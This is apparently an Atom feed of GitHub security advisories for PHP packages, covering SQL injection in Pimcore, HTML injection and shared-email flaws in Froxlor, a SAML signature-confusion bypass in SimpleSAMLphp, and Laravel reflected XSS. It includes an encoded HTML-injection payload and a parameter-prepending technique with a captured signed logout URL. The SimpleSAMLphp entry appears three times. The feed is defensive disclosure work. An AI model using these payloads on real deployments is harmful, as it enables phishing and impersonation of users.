<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2025-03-12T05:01:19.181Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore Vulnerable to SQL Injection in getRelationFilterCondition]]></title>
        <id>https://github.com/advisories/GHSA-qjpx-5m2p-5pgh</id>
        <link href="https://github.com/advisories/GHSA-qjpx-5m2p-5pgh"/>
        <updated>2025-03-11T21:33:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Authenticated users can craft a filter string used to cause a SQL injection.</p>
<h3 id="details">Details</h3>
<p><em>Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.</em>
This code does not look to sanitize inputs: <a href="https://github.com/pimcore/pimcore/blob/c721a42c23efffd4ca916511ddb969598d302396/models/DataObject/ClassDefinition/Data/Extension/RelationFilterConditionParser.php#L29-L47">https://github.com/pimcore/pimcore/blob/c721a42c23efffd4ca916511ddb969598d302396/models/DataObject/ClassDefinition/Data/Extension/RelationFilterConditionParser.php#L29-L47</a></p>
<p>c.f. with <a href="https://github.com/pimcore/pimcore/blob/c721a42c23efffd4ca916511ddb969598d302396/models/DataObject/ClassDefinition/Data/Multiselect.php#L332-L347">https://github.com/pimcore/pimcore/blob/c721a42c23efffd4ca916511ddb969598d302396/models/DataObject/ClassDefinition/Data/Multiselect.php#L332-L347</a></p>
<h3 id="poc">PoC</h3>
<p><em>Complete instructions, including specific configuration details, to reproduce the vulnerability.</em></p>
<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-qjpx-5m2p-5pgh">https://github.com/pimcore/pimcore/security/advisories/GHSA-qjpx-5m2p-5pgh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27617">https://nvd.nist.gov/vuln/detail/CVE-2025-27617</a></li>
<li><a href="https://github.com/pimcore/pimcore/commit/19a8520895484e68fd254773e32476565d91deea">https://github.com/pimcore/pimcore/commit/19a8520895484e68fd254773e32476565d91deea</a></li>
<li><a href="https://github.com/pimcore/pimcore/blob/c721a42c23efffd4ca916511ddb969598d302396/models/DataObject/ClassDefinition/Data/Extension/RelationFilterConditionParser.php#L29-L47">https://github.com/pimcore/pimcore/blob/c721a42c23efffd4ca916511ddb969598d302396/models/DataObject/ClassDefinition/Data/Extension/RelationFilterConditionParser.php#L29-L47</a></li>
<li><a href="https://github.com/pimcore/pimcore/blob/c721a42c23efffd4ca916511ddb969598d302396/models/DataObject/ClassDefinition/Data/Multiselect.php#L332-L347">https://github.com/pimcore/pimcore/blob/c721a42c23efffd4ca916511ddb969598d302396/models/DataObject/ClassDefinition/Data/Multiselect.php#L332-L347</a></li>
<li><a href="https://github.com/advisories/GHSA-qjpx-5m2p-5pgh">https://github.com/advisories/GHSA-qjpx-5m2p-5pgh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjpx-5m2p-5pgh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-11T21:33:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[froxlor/froxlor] Froxlor has an HTML Injection Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-26xq-m8xw-6373</id>
        <link href="https://github.com/advisories/GHSA-26xq-m8xw-6373"/>
        <updated>2025-03-11T20:31:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><em>An HTML Injection vulnerability in the customer account portal allows an attacker to inject malicious HTML payloads in the email section. This can lead to phishing attacks, credential theft, and reputational damage by redirecting users to malicious external websites. The vulnerability has a medium severity, as it can be exploited through user input without authentication.</em></p>
<h3 id="observation">Observation</h3>
<p><em>It is observed that in the portal of the customer account, there is a functionality in the email section to create an email address that accepts user input. By intercepting the request and modifying the "domain" field with an HTML injection payload containing an anchor tag, the injected payload is reflected on an error page. When clicked, it redirects users to an external website, confirming the presence of an HTML Injection vulnerability.</em></p>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Navigate to the Email section in the Customer Account Portal and create a new email address.</p>
</li>
<li><p>Enter any garbage value in the required field and intercept the request using Burp Suite.</p>
</li>
<li><p>Locate the "domain" field in the intercepted request and replace its value with the following HTML Injection payload:</p>
<p> <code>&lt;a href="&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x73;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x77;&amp;#x77;&amp;#x77;&amp;#x2e;&amp;#x67;&amp;#x6f;&amp;#x6f;&amp;#x67;&amp;#x6c;&amp;#x65;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;"&gt;CLiCK&lt;/a&gt;</code></p>
</li>
<li><p>Forward the modified request and observe that the injected payload is reflected on an error page.</p>
</li>
<li><p>Click on the displayed "CLiCK" link to verify that it redirects to <code>https://www.google.com</code>, confirming the presence of HTML <a href="%5Burl%5D(%5Bfroxlor_HTML-INJECTION.mp4.zip%5D(https://github.com/user-attachments/files/18311429/froxlor_HTML-INJECTION.mp4.zip))">Injection.</a></p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p><em>An attacker can exploit this HTML Injection vulnerability to manipulate the portal’s content, conduct phishing attacks, deface the application, or trick users into clicking malicious links. This can lead to credential theft, malware distribution, reputational damage, and potential compliance violations.
The users of the customer account portal are impacted by this vulnerability. Specifically, any user who interacts with the email section of the portal may be tricked into clicking malicious links, leading to potential phishing attacks, credential theft, and exposure to other malicious activities. The organization hosting the portal could also be impacted by reputational damage and compliance violations.</em></p>
<h3 id="recommendation">Recommendation</h3>
<p><em>It is recommended to implement proper input validation and output encoding to prevent HTML Injection. The application should sanitize user input by stripping or escaping HTML tags before rendering it on the page.</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/froxlor/Froxlor/security/advisories/GHSA-26xq-m8xw-6373">https://github.com/froxlor/Froxlor/security/advisories/GHSA-26xq-m8xw-6373</a></li>
<li><a href="https://github.com/froxlor/Froxlor/commit/fde43f80600f1035e1e3d2297411b666d805549a">https://github.com/froxlor/Froxlor/commit/fde43f80600f1035e1e3d2297411b666d805549a</a></li>
<li><a href="https://github.com/user-attachments/assets/86947633-3e7c-4e10-86cc-92e577761e8e">https://github.com/user-attachments/assets/86947633-3e7c-4e10-86cc-92e577761e8e</a></li>
<li><a href="https://github.com/advisories/GHSA-26xq-m8xw-6373">https://github.com/advisories/GHSA-26xq-m8xw-6373</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-26xq-m8xw-6373</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-11T20:31:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[froxlor/froxlor] Froxlor allows Multiple Accounts to Share the Same Email Address Leading to Potential Privilege Escalation or Account Takeover]]></title>
        <id>https://github.com/advisories/GHSA-7j6w-p859-464f</id>
        <link href="https://github.com/advisories/GHSA-7j6w-p859-464f"/>
        <updated>2025-03-11T20:30:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>the vulnerability is that users (such as resellers or customers) are able to create accounts with the same email address as an existing account (e.g., if the admin has <a href="mailto:admin@froxlor.com">admin@froxlor.com</a>, others can also create an account using the same email). This creates potential issues with account identification and security.</p>
<h3 id="impact">Impact</h3>
<p>Local/Authenticated: This vulnerability can be exploited by authenticated users (e.g., reseller, customer) who can create accounts with the same email address that has already been used by another account, such as the admin.
Email-based: The attack vector is email-based, as the system does not prevent multiple accounts from registering the same email address, leading to possible conflicts and security issues.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/froxlor/Froxlor/security/advisories/GHSA-7j6w-p859-464f">https://github.com/froxlor/Froxlor/security/advisories/GHSA-7j6w-p859-464f</a></li>
<li><a href="https://mega.nz/file/h8oFHQrL#I4V02_BWee4CCx7OoBl_2Ufkd5Wc7fvs5aCatGApkoQ">https://mega.nz/file/h8oFHQrL#I4V02_BWee4CCx7OoBl_2Ufkd5Wc7fvs5aCatGApkoQ</a></li>
<li><a href="https://github.com/froxlor/Froxlor/commit/a43d53d54034805e3e404702a01312fa0c40b623">https://github.com/froxlor/Froxlor/commit/a43d53d54034805e3e404702a01312fa0c40b623</a></li>
<li><a href="https://github.com/advisories/GHSA-7j6w-p859-464f">https://github.com/advisories/GHSA-7j6w-p859-464f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7j6w-p859-464f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-11T20:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[simplesamlphp/saml2-legacy] The SimpleSAMLphp SAML2 library incorrectly verifies signatures for HTTP-Redirect binding]]></title>
        <id>https://github.com/advisories/GHSA-46r4-f8gj-xg56</id>
        <link href="https://github.com/advisories/GHSA-46r4-f8gj-xg56"/>
        <updated>2025-03-11T19:23:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There's a signature confusion attack in the HTTPRedirect binding. An attacker with any signed SAMLResponse via the HTTP-Redirect binding can cause the application to accept an unsigned message.</p>
<p>I believe that it exists for v4 only. I have not yet developed a PoC.</p>
<p>V5 is well designed and instead builds the signed query from the same message that will be consumed.</p>
<h3 id="details">Details</h3>
<h4 id="what-is-verified">What is verified</h4>
<p>The data['SignedQuery'] is the string that will be verified by the public key. </p>
<p>It is defined here:
<a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></p>
<p>THe code will iterate through each parameter name. Notably, sigQuery is overridden each time when processing, making the last of SAMLRequest/SAMLResponse used for sigQuery.</p>
<p>For example, given:</p>
<p>SAMLRequest=a&amp;SAMLResponse=idpsigned</p>
<p>SAMLResponse=idpsigned will be set as sigQuery, then later verified</p>
<h4 id="what-is-actually-processed">What is actually processed</h4>
<p>Processing uses SAMLRequest parameter value first, (if it exists) then SAMLResponse:</p>
<p><a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></p>
<p>Given this, the contents that are processed might not be the same as the data that is actually verified.</p>
<h3 id="exploiting">Exploiting</h3>
<p>Suppose an attacker has a signed HTTP Redirect binding from IdP, say a signed logout response. :</p>
<p>SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature</p>
<p>Then an attacker can append SAMLRequest in front:</p>
<p><code>SAMLRequest=unverifieddata&amp;SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature=..</code></p>
<p>SimpleSAMLPhp will only verify the SAMLResponse, but will actually use the SAMLRequest contents. The impact here is increased because there's no checks that SAMLRequest actually contains a Request, it could instead contain an Response, which allows the attacker to effectively impersonate any user within the SP.</p>
<h3 id="idps">IdPs</h3>
<p>Microsoft Azure AD/Entra (and likely ADFS) signs the LogoutResponse via this SimpleSign format in HTTP Redirect binding. If an attacker logs out of Entra, they will be able to extract a valid Signature.</p>
<p>Attached is an HTTP Request when an I initiated a SLO request from the service provider to the IdP (entra). Then IdP POSTed this SAMLResponse with HTTP Redirect binding signature, via the user browser to the SP. It should be possible to carry out the described attack with this.</p>
<pre><code>https://webhook.site/c6038292-6ef5-46ac-973d-d7c25520ec48/logout?SAMLResponse=fVJNa%2bMwEP0rRndZtmw5tnAMy%2fYSaC9N6aGXIsmjVMTRGI9M%2bvObdeihsPQ4w7x5HzM9mcs060c84ZqegWaMBNnhYc%2fejS1UW1TAnVU7XldK8s7JkcvOd60Db3zTsewVFgoY90zmBcsORCscIiUT061VyJqXJS%2fbl7LRUmrZ5mXdvLHsASiFaNKG%2fEhpJi3EFewH4jmnkEC4pqha2UnegFe8bozj3a4a%2bbhzUilZgKtbMW2yb7TxW%2foL7lkM9hTC2XnEOPvZXjDECb2N1lh7mvBsp%2bnsErDs8zJF0lsEe7YuUaOhQDqaC5BOTh%2f%2fPD3qmzE9L5jQ4cSGfrO43KG%2fgwwRLP8ssuHbIiXKryGOeKU8QhLSVN7WteejV8Bru%2bt4WynFbwE3bdVV5ahG0Ys759Dfj3VMJq30s%2fqLI2SvZlrhd020Tevj6hwQMTH04udS8b%2bHGL4A&amp;Signature=Z%2f7gIPv7Gkgvqtwo0bzgXyum9IjHMfP0zTYuNbl%2fBUGlQ%2fU%2bbOZGZJ6Rk9wLUyvNQ5XlZRxZrfESNA%2bn0CVyIedsg9GxQKTi7VqPTJFJqEIP1BZaEpYYP3%2f6sFfLxfTMKecJoQdxnDE5Malte1hMj2UujWnLXOnp0CgO%2f%2fU2K52SoGckIzNDRB%2fJ6%2fysTn%2bDjBrmgdro%2fgdTyby9%2f3vm8dzY8pUkRCgMjlimShrZxr5U33wQvwPLIXlDgActr91RUtWKE0k8sy%2brshrK9DKLPo8AdTLk7NYhjSWdF7OG7uqgEeEo470tacqQuA09E0qDh8CWS%2bycLJijiGYWVyQa4Q%3d%3d&amp;SigAlg=http%3a%2f%2fwww.w3.org%2f2001%2f04%2fxmldsig-more%23rsa-sha256
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56">https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56</a></li>
<li><a href="https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0">https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0</a></li>
<li><a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></li>
<li><a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></li>
<li><a href="https://github.com/advisories/GHSA-46r4-f8gj-xg56">https://github.com/advisories/GHSA-46r4-f8gj-xg56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46r4-f8gj-xg56</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-11T19:23:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[simplesamlphp/saml2] The SimpleSAMLphp SAML2 library incorrectly verifies signatures for HTTP-Redirect binding]]></title>
        <id>https://github.com/advisories/GHSA-46r4-f8gj-xg56</id>
        <link href="https://github.com/advisories/GHSA-46r4-f8gj-xg56"/>
        <updated>2025-03-11T19:23:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There's a signature confusion attack in the HTTPRedirect binding. An attacker with any signed SAMLResponse via the HTTP-Redirect binding can cause the application to accept an unsigned message.</p>
<p>I believe that it exists for v4 only. I have not yet developed a PoC.</p>
<p>V5 is well designed and instead builds the signed query from the same message that will be consumed.</p>
<h3 id="details">Details</h3>
<h4 id="what-is-verified">What is verified</h4>
<p>The data['SignedQuery'] is the string that will be verified by the public key. </p>
<p>It is defined here:
<a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></p>
<p>THe code will iterate through each parameter name. Notably, sigQuery is overridden each time when processing, making the last of SAMLRequest/SAMLResponse used for sigQuery.</p>
<p>For example, given:</p>
<p>SAMLRequest=a&amp;SAMLResponse=idpsigned</p>
<p>SAMLResponse=idpsigned will be set as sigQuery, then later verified</p>
<h4 id="what-is-actually-processed">What is actually processed</h4>
<p>Processing uses SAMLRequest parameter value first, (if it exists) then SAMLResponse:</p>
<p><a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></p>
<p>Given this, the contents that are processed might not be the same as the data that is actually verified.</p>
<h3 id="exploiting">Exploiting</h3>
<p>Suppose an attacker has a signed HTTP Redirect binding from IdP, say a signed logout response. :</p>
<p>SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature</p>
<p>Then an attacker can append SAMLRequest in front:</p>
<p><code>SAMLRequest=unverifieddata&amp;SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature=..</code></p>
<p>SimpleSAMLPhp will only verify the SAMLResponse, but will actually use the SAMLRequest contents. The impact here is increased because there's no checks that SAMLRequest actually contains a Request, it could instead contain an Response, which allows the attacker to effectively impersonate any user within the SP.</p>
<h3 id="idps">IdPs</h3>
<p>Microsoft Azure AD/Entra (and likely ADFS) signs the LogoutResponse via this SimpleSign format in HTTP Redirect binding. If an attacker logs out of Entra, they will be able to extract a valid Signature.</p>
<p>Attached is an HTTP Request when an I initiated a SLO request from the service provider to the IdP (entra). Then IdP POSTed this SAMLResponse with HTTP Redirect binding signature, via the user browser to the SP. It should be possible to carry out the described attack with this.</p>
<pre><code>https://webhook.site/c6038292-6ef5-46ac-973d-d7c25520ec48/logout?SAMLResponse=fVJNa%2bMwEP0rRndZtmw5tnAMy%2fYSaC9N6aGXIsmjVMTRGI9M%2bvObdeihsPQ4w7x5HzM9mcs060c84ZqegWaMBNnhYc%2fejS1UW1TAnVU7XldK8s7JkcvOd60Db3zTsewVFgoY90zmBcsORCscIiUT061VyJqXJS%2fbl7LRUmrZ5mXdvLHsASiFaNKG%2fEhpJi3EFewH4jmnkEC4pqha2UnegFe8bozj3a4a%2bbhzUilZgKtbMW2yb7TxW%2foL7lkM9hTC2XnEOPvZXjDECb2N1lh7mvBsp%2bnsErDs8zJF0lsEe7YuUaOhQDqaC5BOTh%2f%2fPD3qmzE9L5jQ4cSGfrO43KG%2fgwwRLP8ssuHbIiXKryGOeKU8QhLSVN7WteejV8Bru%2bt4WynFbwE3bdVV5ahG0Ys759Dfj3VMJq30s%2fqLI2SvZlrhd020Tevj6hwQMTH04udS8b%2bHGL4A&amp;Signature=Z%2f7gIPv7Gkgvqtwo0bzgXyum9IjHMfP0zTYuNbl%2fBUGlQ%2fU%2bbOZGZJ6Rk9wLUyvNQ5XlZRxZrfESNA%2bn0CVyIedsg9GxQKTi7VqPTJFJqEIP1BZaEpYYP3%2f6sFfLxfTMKecJoQdxnDE5Malte1hMj2UujWnLXOnp0CgO%2f%2fU2K52SoGckIzNDRB%2fJ6%2fysTn%2bDjBrmgdro%2fgdTyby9%2f3vm8dzY8pUkRCgMjlimShrZxr5U33wQvwPLIXlDgActr91RUtWKE0k8sy%2brshrK9DKLPo8AdTLk7NYhjSWdF7OG7uqgEeEo470tacqQuA09E0qDh8CWS%2bycLJijiGYWVyQa4Q%3d%3d&amp;SigAlg=http%3a%2f%2fwww.w3.org%2f2001%2f04%2fxmldsig-more%23rsa-sha256
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56">https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56</a></li>
<li><a href="https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0">https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0</a></li>
<li><a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></li>
<li><a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></li>
<li><a href="https://github.com/advisories/GHSA-46r4-f8gj-xg56">https://github.com/advisories/GHSA-46r4-f8gj-xg56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46r4-f8gj-xg56</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-11T19:23:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[simplesamlphp/saml2] The SimpleSAMLphp SAML2 library incorrectly verifies signatures for HTTP-Redirect binding]]></title>
        <id>https://github.com/advisories/GHSA-46r4-f8gj-xg56</id>
        <link href="https://github.com/advisories/GHSA-46r4-f8gj-xg56"/>
        <updated>2025-03-11T19:23:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There's a signature confusion attack in the HTTPRedirect binding. An attacker with any signed SAMLResponse via the HTTP-Redirect binding can cause the application to accept an unsigned message.</p>
<p>I believe that it exists for v4 only. I have not yet developed a PoC.</p>
<p>V5 is well designed and instead builds the signed query from the same message that will be consumed.</p>
<h3 id="details">Details</h3>
<h4 id="what-is-verified">What is verified</h4>
<p>The data['SignedQuery'] is the string that will be verified by the public key. </p>
<p>It is defined here:
<a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></p>
<p>THe code will iterate through each parameter name. Notably, sigQuery is overridden each time when processing, making the last of SAMLRequest/SAMLResponse used for sigQuery.</p>
<p>For example, given:</p>
<p>SAMLRequest=a&amp;SAMLResponse=idpsigned</p>
<p>SAMLResponse=idpsigned will be set as sigQuery, then later verified</p>
<h4 id="what-is-actually-processed">What is actually processed</h4>
<p>Processing uses SAMLRequest parameter value first, (if it exists) then SAMLResponse:</p>
<p><a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></p>
<p>Given this, the contents that are processed might not be the same as the data that is actually verified.</p>
<h3 id="exploiting">Exploiting</h3>
<p>Suppose an attacker has a signed HTTP Redirect binding from IdP, say a signed logout response. :</p>
<p>SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature</p>
<p>Then an attacker can append SAMLRequest in front:</p>
<p><code>SAMLRequest=unverifieddata&amp;SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature=..</code></p>
<p>SimpleSAMLPhp will only verify the SAMLResponse, but will actually use the SAMLRequest contents. The impact here is increased because there's no checks that SAMLRequest actually contains a Request, it could instead contain an Response, which allows the attacker to effectively impersonate any user within the SP.</p>
<h3 id="idps">IdPs</h3>
<p>Microsoft Azure AD/Entra (and likely ADFS) signs the LogoutResponse via this SimpleSign format in HTTP Redirect binding. If an attacker logs out of Entra, they will be able to extract a valid Signature.</p>
<p>Attached is an HTTP Request when an I initiated a SLO request from the service provider to the IdP (entra). Then IdP POSTed this SAMLResponse with HTTP Redirect binding signature, via the user browser to the SP. It should be possible to carry out the described attack with this.</p>
<pre><code>https://webhook.site/c6038292-6ef5-46ac-973d-d7c25520ec48/logout?SAMLResponse=fVJNa%2bMwEP0rRndZtmw5tnAMy%2fYSaC9N6aGXIsmjVMTRGI9M%2bvObdeihsPQ4w7x5HzM9mcs060c84ZqegWaMBNnhYc%2fejS1UW1TAnVU7XldK8s7JkcvOd60Db3zTsewVFgoY90zmBcsORCscIiUT061VyJqXJS%2fbl7LRUmrZ5mXdvLHsASiFaNKG%2fEhpJi3EFewH4jmnkEC4pqha2UnegFe8bozj3a4a%2bbhzUilZgKtbMW2yb7TxW%2foL7lkM9hTC2XnEOPvZXjDECb2N1lh7mvBsp%2bnsErDs8zJF0lsEe7YuUaOhQDqaC5BOTh%2f%2fPD3qmzE9L5jQ4cSGfrO43KG%2fgwwRLP8ssuHbIiXKryGOeKU8QhLSVN7WteejV8Bru%2bt4WynFbwE3bdVV5ahG0Ys759Dfj3VMJq30s%2fqLI2SvZlrhd020Tevj6hwQMTH04udS8b%2bHGL4A&amp;Signature=Z%2f7gIPv7Gkgvqtwo0bzgXyum9IjHMfP0zTYuNbl%2fBUGlQ%2fU%2bbOZGZJ6Rk9wLUyvNQ5XlZRxZrfESNA%2bn0CVyIedsg9GxQKTi7VqPTJFJqEIP1BZaEpYYP3%2f6sFfLxfTMKecJoQdxnDE5Malte1hMj2UujWnLXOnp0CgO%2f%2fU2K52SoGckIzNDRB%2fJ6%2fysTn%2bDjBrmgdro%2fgdTyby9%2f3vm8dzY8pUkRCgMjlimShrZxr5U33wQvwPLIXlDgActr91RUtWKE0k8sy%2brshrK9DKLPo8AdTLk7NYhjSWdF7OG7uqgEeEo470tacqQuA09E0qDh8CWS%2bycLJijiGYWVyQa4Q%3d%3d&amp;SigAlg=http%3a%2f%2fwww.w3.org%2f2001%2f04%2fxmldsig-more%23rsa-sha256
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56">https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56</a></li>
<li><a href="https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0">https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0</a></li>
<li><a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></li>
<li><a href="https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></li>
<li><a href="https://github.com/advisories/GHSA-46r4-f8gj-xg56">https://github.com/advisories/GHSA-46r4-f8gj-xg56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46r4-f8gj-xg56</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-11T19:23:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[laravel/framework] Laravel framework susceptible to reflected cross-site scripting]]></title>
        <id>https://github.com/advisories/GHSA-546h-56qp-8jmw</id>
        <link href="https://github.com/advisories/GHSA-546h-56qp-8jmw"/>
        <updated>2025-03-11T14:31:26.000Z</updated>
        <content type="html"><![CDATA[<p>The Laravel framework versions between 11.9.0 and 11.35.1 are susceptible to reflected cross-site scripting due to an improper encoding of request parameters in the debug-mode error page.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-13918">https://nvd.nist.gov/vuln/detail/CVE-2024-13918</a></li>
<li><a href="https://github.com/laravel/framework/pull/53869">https://github.com/laravel/framework/pull/53869</a></li>
<li><a href="https://github.com/laravel/framework/releases/tag/v11.36.0">https://github.com/laravel/framework/releases/tag/v11.36.0</a></li>
<li><a href="https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-01_Laravel_Reflected_XSS_via_Request_Parameter_in_Debug-Mode_Error_Page">https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-01_Laravel_Reflected_XSS_via_Request_Parameter_in_Debug-Mode_Error_Page</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/10/3">http://www.openwall.com/lists/oss-security/2025/03/10/3</a></li>
